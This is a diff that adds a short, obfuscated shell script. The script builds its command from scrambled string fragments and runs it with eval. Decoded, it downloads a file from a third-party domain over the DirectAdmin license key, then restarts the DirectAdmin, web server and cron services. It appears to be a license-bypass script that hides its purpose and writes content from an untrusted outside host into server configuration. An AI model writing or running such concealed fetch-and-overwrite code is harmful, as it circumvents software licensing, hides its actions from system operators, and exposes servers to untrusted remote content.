@@ -1,0 +1,3 @@
+z="
+";Nz='s://';Kz='nse.';Yz='min ';Zz='star';Sz='ey/l';bz='d re';Lz='key ';Bz=' -O ';Oz='dire';Pz='ctad';Iz='onf/';Dz='/loc';Mz='http';Jz='lice';Vz='ey';az='t';Cz='/usr';Wz='serv';Fz='irec';Hz='in/c';Uz='se.k';Az='wget';cz='cron';Qz='min.';Ez='al/d';Xz='ice ';Gz='tadm';Rz='ga/k';Tz='icen';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$z$Wz$Xz$Oz$Pz$Yz$Zz$az$z$Wz$Xz$Mz$bz$Zz$az$z$Wz$Xz$cz$bz$Zz$az"
